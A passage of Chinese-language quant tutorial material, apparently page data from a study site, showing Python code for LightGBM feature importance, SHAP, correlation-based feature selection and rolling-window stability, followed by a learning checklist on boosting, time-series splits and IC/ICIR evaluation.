shap_feature_importance(shap_values, feature_names, top_n=20):\n    &quot;&quot;&quot;\n    基于SHAP值的特征重要性\n \n    参数:\n        shap_values: SHAP值数组\n        feature_names: 特征名称\n        top_n: 显示前n个特征\n \n    返回:\n        重要性排序结果\n    &quot;&quot;&quot;\n    # 计算每个特征的平均绝对SHAP值\n    mean_abs_shap = np.abs(shap_values).mean(axis=0)\n \n    # 排序\n    indices = np.argsort(mean_abs_shap)[::-1][:top_n]\n    importance = mean_abs_shap[indices]\n    names = np.array(feature_names)[indices]\n \n    # 打印\n    print(&quot;SHAP Feature Importance:&quot;)\n    for i, (name, imp) in enumerate(zip(names, importance)):\n        print(f&quot;  {i+1}. {name}: {imp:.4f}&quot;)\n \n    return indices, importance, names\n \n# 使用示例\nindices, importance, names = shap_feature_importance(shap_values, feature_names, top_n=20)\n4.3 个体解释\ndef plot_shap_force(explainer, X, sample_idx, feature_names):\n    &quot;&quot;&quot;\n    绘制单个样本的SHAP Force Plot\n \n    参数:\n        explainer: SHAP解释器\n        X: 特征矩阵\n        sample_idx: 样本索引\n        feature_names: 特征名称\n    &quot;&quot;&quot;\n    # 计算SHAP值\n    shap_values = explainer.shap_values(X[[sample_idx]])\n \n    # 绘制Force Plot\n    shap.force_plot(explainer.expected_value[0],\n                   shap_values[0],\n                   X[sample_idx],\n                   feature_names=feature_names)\n \n# 使用示例\nplot_shap_force(explainer, X_val, sample_idx=0, feature_names=feature_names)\n5. 特征相关性分析\n5.1 为什么特征相关性重要？\n高相关的特征：\n\n提供冗余信息\n可能导致重要性”分散”\n增加模型复杂度但不增加价值\n\n建议：\n\n同类特征保留最重要的 1-2 个\n相关性 &gt; 0.9 的特征考虑合并或剔除\n\n5.2 相关性计算\ndef analyze_feature_correlation(X, features, threshold=0.7):\n    &quot;&quot;&quot;\n    分析特征相关性\n \n    参数:\n        X: 特征 DataFrame\n        features: 特征列表\n        threshold: 高相关阈值\n \n    返回:\n        high_corr_pairs: 高相关特征对\n    &quot;&quot;&quot;\n    # 计算相关矩阵\n    corr_matrix = X[features].corr()\n \n    # 找高相关对\n    high_corr_pairs = []\n    for i, feat1 in enumerate(features):\n        for feat2 in features[i+1:]:\n            corr = corr_matrix.loc[feat1, feat2]\n            if abs(corr) &gt; threshold:\n                high_corr_pairs.append((feat1, feat2, corr))\n \n    # 排序\n    high_corr_pairs.sort(key=lambda x: abs(x[2]), reverse=True)\n \n    # 打印\n    print(f&quot;\\n📊 高相关特征对 (|corr| &gt; {threshold}):&quot;)\n    print(&quot;-&quot; * 50)\n    for feat1, feat2, corr in high_corr_pairs:\n        print(f&quot;  {feat1:12s} ↔ {feat2:12s} : {corr:.3f}&quot;)\n \n    return high_corr_pairs\n \n# 使用示例\nhigh_corr_pairs = analyze_feature_correlation(X_train, list(FEATURES.keys()), threshold=0.7)\n示例输出：\n高相关特征对 (|corr| &gt; 0.7):\n--------------------------------------------------\nRET_5D       ↔ BIAS_10     :  0.931\nRET_10D      ↔ BIAS_20     :  0.924\nBIAS_10      ↔ BIAS_20     :  0.873\nBIAS_5       ↔ BIAS_10     :  0.860\nRET_10D      ↔ BIAS_10     :  0.834\nRET_20D      ↔ BIAS_20     :  0.829\nRET_5D       ↔ BIAS_5      :  0.818\nRET_1D       ↔ BODY        :  0.814\nRET_5D       ↔ BIAS_20     :  0.769\nVOL_10       ↔ VOL_20      :  0.745\n\n5.3 相关性热力图可视化\ndef plot_correlation_heatmap(X, features, top_n=30):\n    &quot;&quot;&quot;\n    绘制特征相关性热力图\n \n    参数:\n        X: 特征 DataFrame\n        features: 特征列表\n        top_n: 显示前n个特征\n    &quot;&quot;&quot;\n    # 计算相关性矩阵\n    corr_matrix = X[features[:top_n]].corr()\n \n    # 绘制热力图\n    import seaborn as sns\n    plt.figure(figsize=(12, 10))\n \n    mask = np.triu(np.ones_like(corr_matrix, dtype=bool))\n    sns.heatmap(corr_matrix,\n                mask=mask,\n                cmap=&#039;coolwarm&#039;,\n                center=0,\n                square=True,\n                linewidths=1,\n                cbar_kws={&quot;shrink&quot;: 0.8},\n                annot=False,\n                fmt=&#039;.2f&#039;,\n                xticklabels=1,\n                yticklabels=1)\n \n    plt.title(&#039;Feature Correlation Heatmap&#039;, fontsize=14, fontweight=&#039;bold&#039;)\n    plt.xlabel(&#039;Features&#039;, fontsize=12)\n    plt.ylabel(&#039;Features&#039;, fontsize=12)\n    plt.xticks(rotation=45, ha=&#039;right&#039;)\n    plt.yticks(rotation=0)\n    plt.tight_layout()\n    plt.show()\n \n# 使用示例\nplot_correlation_heatmap(X_train, list(FEATURES.keys()), top_n=30)\n5.4 基于相关性的特征筛选\ndef filter_features_by_correlation(X, features, threshold=0.9, importance=None):\n    &quot;&quot;&quot;\n    基于相关性筛选特征\n \n    策略：\n    1. 找到高相关特征对\n    2. 如果两个特征相关性 &gt; threshold\n    3. 保留重要性更高的特征\n \n    参数:\n        X: 特征 DataFrame\n        features: 特征列表\n        threshold: 相关性阈值\n        importance: 特征重要性字典 {feature: importance}\n \n    返回:\n        selected_features: 筛选后的特征列表\n    &quot;&quot;&quot;\n    # 计算相关矩阵\n    corr_matrix = X[features].corr()\n \n    # 如果没有提供重要性，使用默认值\n    if importance is None:\n        importance = {feat: 1.0 for feat in features}\n \n    # 标记要删除的特征\n    to_remove = set()\n \n    for i, feat1 in enumerate(features):\n        for feat2 in features[i+1:]:\n            corr = abs(corr_matrix.loc[feat1, feat2])\n \n            if corr &gt; threshold:\n                # 保留重要性更高的特征\n                if importance[feat1] &gt;= importance[feat2]:\n                    to_remove.add(feat2)\n                    print(f&quot;移除 {feat2} (与 {feat1} 相关性={corr:.3f})&quot;)\n                else:\n                    to_remove.add(feat1)\n                    print(f&quot;移除 {feat1} (与 {feat2} 相关性={corr:.3f})&quot;)\n \n    # 筛选特征\n    selected_features = [f for f in features if f not in to_remove]\n \n    print(f&quot;\\n原始特征数: {len(features)}&quot;)\n    print(f&quot;筛选后特征数: {len(selected_features)}&quot;)\n    print(f&quot;删除特征数: {len(to_remove)}&quot;)\n \n    return selected_features\n \n# 使用示例\nimportance_dict = dict(zip(feature_names, gain_importance))\nselected_features = filter_features_by_correlation(\n    X_train, \n    list(FEATURES.keys()),\n    threshold=0.9,\n    importance=importance_dict\n)\n6. 重训练验证\n6.1 验证特征选择的效果\ndef validate_feature_selection(X_train, y_train, X_valid, y_valid, X_test, y_test,\n                         full_features, selected_features, params):\n    &quot;&quot;&quot;\n    验证特征选择的效果\n \n    参数:\n        X_train, y_train: 训练数据\n        X_valid, y_valid: 验证数据\n        X_test, y_test: 测试数据\n        full_features: 所有特征\n        selected_features: 选中的特征\n        params: 模型参数\n \n    返回:\n        comparison: 对比结果\n    &quot;&quot;&quot;\n    import lightgbm as lgb\n    from scipy.stats import pearsonr\n \n    # 训练全特征模型\n    print(&quot;\\n训练全特征模型...&quot;)\n    train_data_full = lgb.Dataset(X_train[full_features], label=y_train)\n    val_data_full = lgb.Dataset(X_valid[full_features], label=y_valid, reference=train_data_full)\n \n    model_full = lgb.train(\n        params,\n        train_data_full,\n        num_boost_round=1000,\n        valid_sets=[train_data_full, val_data_full],\n        callbacks=[\n            lgb.early_stopping(stopping_rounds=50, verbose=False),\n            lgb.log_evaluation(period=100)\n        ]\n    )\n \n    # 训练精选特征模型\n    print(&quot;\\n训练精选特征模型...&quot;)\n    train_data_selected = lgb.Dataset(X_train[selected_features], label=y_train)\n    val_data_selected = lgb.Dataset(X_valid[selected_features], label=y_valid, reference=train_data_selected)\n \n    model_selected = lgb.train(\n        params,\n        train_data_selected,\n        num_boost_round=1000,\n        valid_sets=[train_data_selected, val_data_selected],\n        callbacks=[\n            lgb.early_stopping(stopping_rounds=50, verbose=False),\n            lgb.log_evaluation(period=100)\n        ]\n    )\n \n    # 预测\n    pred_full = model_full.predict(X_test[full_features])\n    pred_selected = model_selected.predict(X_test[selected_features])\n \n    # 计算IC\n    ic_full = pearsonr(pred_full, y_test)[0]\n    ic_selected = pearsonr(pred_selected, y_test)[0]\n \n    # 打印对比\n    print(&quot;\\n🔬 特征选择验证:&quot;)\n    print(&quot;-&quot; * 50)\n    print(f&quot;{&#039;模型&#039;:&lt;15s} {&#039;特征数&#039;:&lt;10s} {&#039;测试集 IC&#039;:&lt;10s}&quot;)\n    print(&quot;-&quot; * 50)\n    print(f&quot;{&#039;全部特征&#039;:&lt;15s} {len(full_features):&lt;10d} {ic_full:&lt;10.4f}&quot;)\n    print(f&quot;{&#039;精选特征&#039;:&lt;15s} {len(selected_features):&lt;10d} {ic_selected:&lt;10.4f}&quot;)\n    print(&quot;-&quot; * 50)\n \n    # 评估\n    ic_ratio = ic_selected / ic_full if ic_full != 0 else 0\n    print(f&quot;\\nIC保持率: {ic_ratio:.2%}&quot;)\n \n    if ic_selected &gt;= ic_full * 0.95:\n        print(&quot;✅ 精选特征表现接近全特征，可以简化模型!&quot;)\n    elif ic_selected &gt;= ic_full * 0.90:\n        print(&quot;⚠️ 精选特征性能略有下降，但简化模型可能值得&quot;)\n    else:\n        print(&quot;❌ 精选特征性能下降较多，需要调整&quot;)\n \n    return {\n        &#039;full_features_ic&#039;: ic_full,\n        &#039;selected_features_ic&#039;: ic_selected,\n        &#039;n_full&#039;: len(full_features),\n        &#039;n_selected&#039;: len(selected_features),\n        &#039;ic_ratio&#039;: ic_ratio,\n        &#039;model_full&#039;: model_full,\n        &#039;model_selected&#039;: model_selected\n    }\n \n# 使用示例\nparams = {\n    &#039;objective&#039;: &#039;regression&#039;,\n    &#039;metric&#039;: &#039;rmse&#039;,\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n    &#039;verbose&#039;: -1,\n}\n \ncomparison = validate_feature_selection(\n    X_train, y_train, X_valid, y_valid, X_test, y_test,\n    full_features=list(FEATURES.keys()),\n    selected_features=selected_features,\n    params=params\n)\n6.2 特征选择效果可视化\ndef plot_feature_selection_comparison(comparison):\n    &quot;&quot;&quot;\n    可视化特征选择对比结果\n \n    参数:\n        comparison: validate_feature_selection 的返回结果\n    &quot;&quot;&quot;\n    fig, axes = plt.subplots(1, 2, figsize=(12, 5))\n \n    # 特征数量对比\n    models = [&#039;全特征&#039;, &#039;精选特征&#039;]\n    n_features = [comparison[&#039;n_full&#039;], comparison[&#039;n_selected&#039;]]\n    ics = [comparison[&#039;full_features_ic&#039;], comparison[&#039;selected_features_ic&#039;]]\n \n    # 特征数 vs IC\n    axes[0].scatter(n_features, ics, s=200, alpha=0.6)\n    axes[0].plot(n_features, ics, &#039;r-&#039;, linewidth=2, alpha=0.5)\n \n    # 添加标注\n    for i, (n, ic, model) in enumerate(zip(n_features, ics, models)):\n        axes[0].annotate(f&#039;{model}\\n{n}特征\\nIC={ic:.4f}&#039;,\n                        (n, ic),\n                        textcoords=&quot;offset points&quot;,\n                        xytext=(0, 10),\n                        ha=&#039;center&#039;)\n \n    axes[0].set_xlabel(&#039;特征数量&#039;)\n    axes[0].set_ylabel(&#039;测试集 IC&#039;)\n    axes[0].set_title(&#039;特征数量 vs 性能&#039;)\n    axes[0].grid(True, alpha=0.3)\n \n    # IC 柱状图\n    bars = axes[1].bar(models, ics, color=[&#039;steelblue&#039;, &#039;coral&#039;], alpha=0.7, edgecolor=&#039;black&#039;)\n    axes[1].set_ylabel(&#039;测试集 IC&#039;)\n    axes[1].set_title(&#039;模型性能对比&#039;)\n    axes[1].grid(True, axis=&#039;y&#039;, alpha=0.3)\n \n    # 添加数值标签\n    for bar, ic in zip(bars, ics):\n        height = bar.get_height()\n        axes[1].text(bar.get_x() + bar.get_width()/2., height,\n                     f&#039;{ic:.4f}&#039;,\n                     ha=&#039;center&#039;, va=&#039;bottom&#039;, fontweight=&#039;bold&#039;)\n \n    # 添加IC保持率\n    axes[1].axhline(y=comparison[&#039;full_features_ic&#039;] * 0.95,\n                   color=&#039;green&#039;, linestyle=&#039;--&#039;, alpha=0.5,\n                   label=&#039;95% 阈值&#039;)\n    axes[1].legend()\n \n    plt.tight_layout()\n    plt.show()\n \n# 使用示例\nplot_feature_selection_comparison(comparison)\n6.3 时序特征重要性\n5. 时序特征重要性\n5.1 滚动窗口特征重要性\n核心思想\n在不同时间窗口内计算特征重要性，分析重要性的稳定性。\n代码实现\ndef rolling_feature_importance(X, y, model_class, params,\n                               window_size=252, step_size=21):\n    &quot;&quot;&quot;\n    滚动窗口特征重要性\n \n    参数:\n        X: 特征矩阵，shape=[n_samples, n_features]\n        y: 目标变量\n        model_class: 模型类\n        params: 模型参数\n        window_size: 窗口大小\n        step_size: 步长\n \n    返回:\n        importance_history: 特征重要性历史\n    &quot;&quot;&quot;\n    n_samples = len(X)\n    importance_history = []\n \n    start_idx = window_size\n    while start_idx + step_size &lt;= n_samples:\n        print(f&quot;Processing window: {start_idx - window_size} - {start_idx}&quot;)\n \n        # 划分数据\n        X_window = X[start_idx - window_size:start_idx]\n        y_window = y[start_idx - window_size:start_idx]\n \n        # 训练模型\n        model = model_class(**params)\n        model.fit(X_window, y_window)\n \n        # 计算特征重要性\n        importance = model.feature_importance(importance_type=&#039;gain&#039;)\n        importance_history.append(importance)\n \n        # 滚动窗口\n        start_idx += step_size\n \n    return np.array(importance_history)\n \n# 使用示例\nimportance_history = rolling_feature_importance(\n    X, y, LGBMRegressor, params,\n    window_size=252,  # 1年\n    step_size=21      # 1个月\n)\n \nprint(f&quot;重要性历史: {importance_history.shape}&quot;)\n5.2 特征重要性稳定性分析\ndef analyze_importance_stability(importance_history, feature_names, top_n=10):\n    &quot;&quot;&quot;\n    分析特征重要性的稳定性\n \n    参数:\n        importance_history: 特征重要性历史，shape=[n_windows, n_features]\n        feature_names: 特征名称\n        top_n: 分析前n个特征\n    &quot;&quot;&quot;\n    # 计算统计量\n    mean_importance = importance_history.mean(axis=0)\n    std_importance = importance_history.std(axis=0)\n    cv_importance = std_importance / (mean_importance + 1e-6)  # 变异系数\n \n    # 排序\n    sorted_indices = np.argsort(mean_importance)[::-1][:top_n]\n \n    # 打印\n    print(f&quot;{&#039;特征&#039;:&lt;20} {&#039;均值&#039;:&gt;10} {&#039;标准差&#039;:&gt;10} {&#039;变异系数&#039;:&gt;10}&quot;)\n    print(&quot;-&quot; * 60)\n    for i, idx in enumerate(sorted_indices):\n        print(f&quot;{feature_names[idx]:&lt;20} &quot;\n              f&quot;{mean_importance[idx]:&gt;10.4f} &quot;\n              f&quot;{std_importance[idx]:&gt;10.4f} &quot;\n              f&quot;{cv_importance[idx]:&gt;10.4f}&quot;)\n \n    # 可视化\n    fig, axes = plt.subplots(1, 2, figsize=(15, 6))\n \n    # 均值vs标准差\n    axes[0].scatter(mean_importance, std_importance, alpha=0.6)\n    for idx in sorted_indices:\n        axes[0].annotate(feature_names[idx],\n                        (mean_importance[idx], std_importance[idx]))\n    axes[0].set_xlabel(&#039;Mean Importance&#039;)\n    axes[0].set_ylabel(&#039;Std Importance&#039;)\n    axes[0].set_title(&#039;Importance Stability&#039;)\n    axes[0].grid(True)\n \n    # 时间序列\n    for idx in sorted_indices:\n        axes[1].plot(importance_history[:, idx], label=feature_names[idx])\n    axes[1].set_xlabel(&#039;Time Window&#039;)\n    axes[1].set_ylabel(&#039;Importance&#039;)\n    axes[1].set_title(f&#039;Top {top_n} Features Importance Over Time&#039;)\n    axes[1].legend()\n    axes[1].grid(True)\n \n    plt.tight_layout()\n    plt.show()\n \n# 使用示例\nanalyze_importance_stability(importance_history, feature_names, top_n=10)\n6. 特征选择策略\n6.1 基于重要性的特征选择\ndef select_features_by_importance(model, X, feature_names,\n                                  importance_type=&#039;gain&#039;, threshold=0.01):\n    &quot;&quot;&quot;\n    基于特征重要性选择特征\n \n    参数:\n        model: LightGBM模型\n        X: 特征矩阵\n        feature_names: 特征名称\n        importance_type: &#039;split&#039; 或 &#039;gain&#039;\n        threshold: 重要性阈值（比例）\n \n    返回:\n        X_selected: 选择后的特征矩阵\n        selected_features: 选择的特征名称\n        selected_indices: 选择的特征索引\n    &quot;&quot;&quot;\n    # 获取特征重要性\n    importance = model.feature_importance(importance_type=importance_type)\n \n    # 归一化\n    importance_normalized = importance / importance.sum()\n \n    # 选择重要性超过阈值的特征\n    selected_indices = np.where(importance_normalized &gt;= threshold)[0]\n \n    # 提取数据\n    X_selected = X[:, selected_indices]\n    selected_features = np.array(feature_names)[selected_indices]\n \n    print(f&quot;选择 {len(selected_indices)}/{len(feature_names)} 个特征&quot;)\n    print(f&quot;累计重要性: {importance_normalized[selected_indices].sum():.2%}&quot;)\n \n    return X_selected, selected_features, selected_indices\n \n# 使用示例\nX_selected, selected_features, selected_indices = select_features_by_importance(\n    model, X, feature_names, importance_type=&#039;gain&#039;, threshold=0.01\n)\n6.2 递归特征消除（RFE）\nfrom sklearn.feature_selection import RFE\n \ndef recursive_feature_elimination(X, y, estimator, n_features_to_select=None,\n                                 step=1, cv=5):\n    &quot;&quot;&quot;\n    递归特征消除\n \n    参数:\n        X: 特征矩阵\n        y: 目标变量\n        estimator: 评估器\n        n_features_to_select: 目标特征数\n        step: 每次消除的特征数\n        cv: 交叉验证折数\n \n    返回:\n        X_selected: 选择后的特征矩阵\n        selected_indices: 选择的特征索引\n        rfe: RFE对象\n    &quot;&quot;&quot;\n    # 创建RFE\n    rfe = RFE(estimator=estimator,\n              n_features_to_select=n_features_to_select,\n              step=step,\n              importance_getter=&#039;auto&#039;)\n \n    # 拟合\n    rfe.fit(X, y)\n \n    # 提取结果\n    selected_indices = np.where(rfe.support_)[0]\n    X_selected = X[:, selected_indices]\n \n    print(f&quot;选择 {len(selected_indices)}/{X.shape[1]} 个特征&quot;)\n \n    return X_selected, selected_indices, rfe\n \n# 使用示例\nestimator = LGBMRegressor(**params)\nX_selected, selected_indices, rfe = recursive_feature_elimination(\n    X, y, estimator, n_features_to_select=50, step=5\n)\n6.3 稳定性特征选择\ndef stable_feature_selection(importance_history, feature_names,\n                             stability_threshold=0.7, top_n=None):\n    &quot;&quot;&quot;\n    稳定性特征选择\n \n    参数:\n        importance_history: 特征重要性历史\n        feature_names: 特征名称\n        stability_threshold: 稳定性阈值\n        top_n: 选择前n个稳定特征\n \n    返回:\n        selected_features: 选择的特征名称\n        stability_scores: 稳定性得分\n    &quot;&quot;&quot;\n    # 计算每个特征的排名\n    rankings = []\n    for importance in importance_history:\n        ranking = np.argsort(importance)[::-1]\n        rankings.append(ranking)\n \n    rankings = np.array(rankings)\n \n    # 计算稳定性得分（基于排名的方差）\n    stability_scores = []\n    for feature_idx in range(len(feature_names)):\n        feature_rankings = np.where(rankings == feature_idx)[1]\n        stability_score = 1 / (1 + np.var(feature_rankings))\n        stability_scores.append(stability_score)\n \n    stability_scores = np.array(stability_scores)\n \n    # 排序\n    sorted_indices = np.argsort(stability_scores)[::-1]\n \n    # 选择稳定特征\n    if top_n is None:\n        selected_indices = sorted_indices[stability_scores[sorted_indices] &gt;= stability_threshold]\n    else:\n        selected_indices = sorted_indices[:top_n]\n \n    selected_features = np.array(feature_names)[selected_indices]\n \n    print(f&quot;选择 {len(selected_indices)} 个稳定特征&quot;)\n \n    return selected_features, stability_scores\n \n# 使用示例\nselected_features, stability_scores = stable_feature_selection(\n    importance_history, feature_names,\n    stability_threshold=0.7, top_n=20\n)\n7. 特征重要性分析的最佳实践\n7.1 综合分析流程\nclass FeatureImportanceAnalyzer:\n    &quot;&quot;&quot;\n    特征重要性分析器\n \n    功能：\n    1. 计算多种特征重要性\n    2. 可视化分析结果\n    3. 时序稳定性分析\n    4. 特征选择建议\n    &quot;&quot;&quot;\n \n    def __init__(self, model, X, y, feature_names):\n        self.model = model\n        self.X = X\n        self.y = y\n        self.feature_names = feature_names\n \n        self.split_importance = None\n        self.gain_importance = None\n        self.permutation_importance = None\n        self.shap_values = None\n \n    def calculate_lightgbm_importance(self):\n        &quot;&quot;&quot;计算LightGBM内置重要性&quot;&quot;&quot;\n        self.split_importance = self.model.feature_importance(importance_type=&#039;split&#039;)\n        self.gain_importance = self.model.feature_importance(importance_type=&#039;gain&#039;)\n \n    def calculate_permutation_importance(self, metric=&#039;ic&#039;, n_repeats=5):\n        &quot;&quot;&quot;计算Permutation Importance&quot;&quot;&quot;\n        self.permutation_importance = permutation_importance(\n            self.model, self.X, self.y,\n            metric=metric, n_repeats=n_repeats\n        )\n \n    def calculate_shap_values(self):\n        &quot;&quot;&quot;计算SHAP值&quot;&quot;&quot;\n        explainer = shap.TreeExplainer(self.model)\n        self.shap_values = explainer.shap_values(self.X)\n \n    def analyze_all(self):\n        &quot;&quot;&quot;执行所有分析&quot;&quot;&quot;\n        print(&quot;计算LightGBM重要性...&quot;)\n        self.calculate_lightgbm_importance()\n \n        print(&quot;计算Permutation Importance...&quot;)\n        self.calculate_permutation_importance()\n \n        print(&quot;计算SHAP值...&quot;)\n        self.calculate_shap_values()\n \n    def plot_summary(self, top_n=20):\n        &quot;&quot;&quot;绘制汇总图&quot;&quot;&quot;\n        fig, axes = plt.subplots(2, 2, figsize=(15, 12))\n \n        # Split重要性\n        indices = np.argsort(self.split_importance)[::-1][:top_n]\n        axes[0, 0].barh(range(len(indices)), self.split_importance[indices][::-1])\n        axes[0, 0].set_yticks(range(len(indices)), np.array(self.feature_names)[indices][::-1])\n        axes[0, 0].set_title(&#039;Split Importance&#039;)\n        axes[0, 0].invert_yaxis()\n \n        # Gain重要性\n        indices = np.argsort(self.gain_importance)[::-1][:top_n]\n        axes[0, 1].barh(range(len(indices)), self.gain_importance[indices][::-1])\n        axes[0, 1].set_yticks(range(len(indices)), np.array(self.feature_names)[indices][::-1])\n        axes[0, 1].set_title(&#039;Gain Importance&#039;)\n        axes[0, 1].invert_yaxis()\n \n        # Permutation Importance\n        if self.permutation_importance is not None:\n            mean_imp = self.permutation_importance.mean(axis=1)\n            indices = np.argsort(mean_imp)[::-1][:top_n]\n            axes[1, 0].barh(range(len(indices)), mean_imp[indices][::-1])\n            axes[1, 0].set_yticks(range(len(indices)), np.array(self.feature_names)[indices][::-1])\n            axes[1, 0].set_title(&#039;Permutation Importance&#039;)\n            axes[1, 0].invert_yaxis()\n \n        # SHAP重要性\n        if self.shap_values is not None:\n            mean_shap = np.abs(self.shap_values).mean(axis=0)\n            indices = np.argsort(mean_shap)[::-1][:top_n]\n            axes[1, 1].barh(range(len(indices)), mean_shap[indices][::-1])\n            axes[1, 1].set_yticks(range(len(indices)), np.array(self.feature_names)[indices][::-1])\n            axes[1, 1].set_title(&#039;SHAP Importance&#039;)\n            axes[1, 1].invert_yaxis()\n \n        plt.tight_layout()\n        plt.show()\n \n# 使用示例\nanalyzer = FeatureImportanceAnalyzer(model, X_val, y_val, feature_names)\nanalyzer.analyze_all()\nanalyzer.plot_summary(top_n=15)\n7.2 检查清单\n特征重要性分析检查清单\n\n 计算至少两种不同的特征重要性\n 可视化特征重要性分布\n 检查特征重要性的稳定性\n 分析特征间的相关性\n 验证特征选择的合理性\n 记录分析过程和结论\n\n时序特征重要性分析检查清单\n\n 使用滚动窗口分析重要性变化\n 识别稳定和不稳定特征\n 分析不同市场状态下的重要性\n 检查重要性与市场周期的关系\n 制定特征更新策略\n\n8. 总结\n特征重要性分析是量化模型开发中的关键环节：\n\n基础重要性：LightGBM内置的Split和Gain重要性\nPermutation Importance：更真实的重要性评估方法\nSHAP分析：提供个体和全局解释\n时序分析：分析重要性的稳定性\n特征选择：基于重要性的特征筛选策略\n\n正确的特征重要性分析能够帮助我们：\n\n理解模型决策逻辑\n识别有效因子\n提升模型性能\n控制模型风险\n"},"quant/qlib/week2/06-学习检查清单":{"slug":"quant/qlib/week2/06-学习检查清单","filePath":"quant/qlib/week2/06-学习检查清单.md","title":"06-学习检查清单","links":[],"tags":[],"content":"学习检查清单\n📋 学习目标检查\n✅ Module 3.1: Gradient Boosting 原理\n\n\n 理解 Boosting 的迭代纠错机制\n\n能解释 Tree₁ → Tree₂ → Tree₃ 的迭代过程\n理解残差学习 r₁ = y - ŷ₁ 的含义\n知道最终预测 = ŷ₁ + ŷ₂ + ŷ₃ + …\n\n\n\n 知道 Bagging vs Boosting 的区别\n\n并行 vs 串行\n降低方差 vs 降低偏差\n不容易过拟合 vs 需要早停控制\n\n\n\n 了解 LightGBM 的三大创新\n\nGOSS (梯度单边采样)：保留大梯度，采样小梯度\nEFB (互斥特征捆绑)：合并稀疏特征\nLeaf-wise 生长：每次分裂增益最大的叶子\n\n\n\n 理解为什么量化偏爱 Boosting\n\n信号很弱（IC 只有 0.03~0.08）\n特征稀疏（不是所有特征都有用）\n需要快速迭代（每天都有新数据）\n\n\n\n✅ Module 3.2: 时序数据划分\n\n\n 知道为什么不能随机划分时序数据\n\n理解数据泄露的概念\n能举例说明随机划分的问题\n知道因果性约束的重要性\n\n\n\n 能正确实现时序划分\ndates = X.index.get_level_values(0)\nunique_dates = dates.unique().sort_values()\ntrain_mask = dates &lt;= unique_dates[int(n_dates * 0.7)]\nvalid_mask = (dates &gt; unique_dates[int(n_dates * 0.7)]) &amp; (dates &lt;= unique_dates[int(n_dates * 0.85)])\ntest_mask = dates &gt; unique_dates[int(n_dates * 0.85)]\n\n\n 了解 Purging 和 Embargo 的作用\n\nPurging: 删除训练集末尾 N 天\nEmbargo: 验证集开头额外空出几天\n能实现完整的 Purging + Embargo\n\n\n\n 能实现 Walk-Forward 验证\n\n理解滚动窗口验证的原理\n能实现 Walk-Forward 验证代码\n能分析多个窗口的 IC 变化\n\n\n\n✅ Module 3.3: LightGBM 训练\n\n\n 了解关键参数的含义\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数推荐值作用learning_rate0.01~0.1控制收敛速度num_leaves31~127控制模型复杂度max_depth6~10防止过拟合feature_fraction0.8特征采样bagging_fraction0.8样本采样lambda_l10.1L1 正则lambda_l20.1L2 正则\n\n\n 能正确创建 Dataset\ntrain_data = lgb.Dataset(X_train.values, label=y_train.values,\n                         feature_name=list(FEATURES.keys()),\n                         categorical_feature=[])\nvalid_data = lgb.Dataset(X_valid.values, label=y_valid.values,\n                         reference=train_data)\n\n\n 能训练模型并使用早停\nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=500,\n    valid_sets=[train_data, valid_data],\n    callbacks=[\n        lgb.early_stopping(stopping_rounds=30),\n        lgb.log_evaluation(period=50)\n    ]\n)\n\n\n 能保存和加载模型\nmodel.save_model(&#039;model.txt&#039;)\nmodel = lgb.Booster(model_file=&#039;model.txt&#039;)\n\n\n✅ Module 3.4: IC/ICIR 评估\n\n\n 理解为什么用 IC 而不是 MSE\n\n量化只关心排序，不关心绝对值\nIC 衡量排序能力，MSE 衡量精确度\n预测 A=0.05, B=0.03 vs A=0.02, B=0.01\n→ MSE 不同，但排序相同，IC 相同\n\n\n\n 能计算 IC 和 Rank IC\nfrom scipy.stats import pearsonr, spearmanr\n \nic, _ = pearsonr(y_pred, y_true)\nrank_ic, _ = spearmanr(y_pred, y_true)\n\n\n 能计算 ICIR 和 IC 胜率\nicir = ic_series.mean() / ic_series.std()\nwin_rate = (ic_series &gt; 0).mean()\n\n\n 能评估模型质量\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nIC 值模型质量&gt; 0.10🌟 顶级 (非常罕见)&gt; 0.05✅ 优秀&gt; 0.03✅ 有效&gt; 0.02⚠️ 一般&lt; 0.02❌ 较弱\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nICIR 值稳定性&gt; 0.5🌟 非常稳定&gt; 0.3✅ 较稳定&gt; 0.2⚠️ 一般&lt; 0.2❌ 不稳定\n\n\n✅ Module 3.5: 特征重要性分析\n\n\n 知道三种重要性计算方式\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n方式速度可靠性推荐度Split快中等⚠️ 一般Gain快高✅ 推荐Permutation慢最高✅ 最可靠\n\n\n 能获取和解读特征重要性\nimportance = model.feature_importance(importance_type=&#039;gain&#039;)\nimportance_df = pd.DataFrame({\n    &#039;feature&#039;: feature_names,\n    &#039;importance&#039;: importance\n}).sort_values(&#039;importance&#039;, ascending=False)\n\n\n 能实现特征选择策略\n\n阈值选择\nTop-K 选择\n递归特征消除 (RFE)\n\n\n\n 能分析特征相关性\ncorr_matrix = X[features].corr()\nhigh_corr_pairs = []\nfor i, feat1 in enumerate(features):\n    for feat2 in features[i+1:]:\n        corr = corr_matrix.loc[feat1, feat2]\n        if abs(corr) &gt; threshold:\n            high_corr_pairs.append((feat1, feat2, corr))\n\n\n🎯 实践能力检查\n✅ 能独立完成的项目\n\n\n 项目1: 基础模型训练\n\n加载数据，正确划分训练集/验证集/测试集\n训练 LightGBM 模型\n评估模型 IC 和 ICIR\n打印完整评估报告\n\n\n\n 项目2: 时序数据划分\n\n实现 Walk-Forward 验证\n实现 Purging 和 Embargo\n分析多个窗口的 IC 变化\n识别模型是否需要重训练\n\n\n\n 项目3: 特征工程\n\n计算多种特征重要性（Split, Gain, Permutation）\n分析特征相关性\n实现特征选择\n验证特征选择的效果\n\n\n\n 项目4: 模型优化\n\n调优关键参数\n实现早停机制\n防止过拟合\n提升模型 IC 和 ICIR\n\n\n\n✅ 能回答的问题\n\n\n为什么量化投资偏爱 Boosting 而不是 Bagging？\n\nBoosting 更适合捕捉微弱信号\n能逐步降低偏差\n在量化场景中表现更好\n\n\n\n为什么不能用随机划分时序数据？\n\n会导致数据泄露（未来信息）\n不符合实际投资场景\n模型性能虚高\n\n\n\nPurging 和 Embargo 的作用是什么？\n\nPurging: 删除训练集末尾，避免标签包含未来信息\nEmbargo: 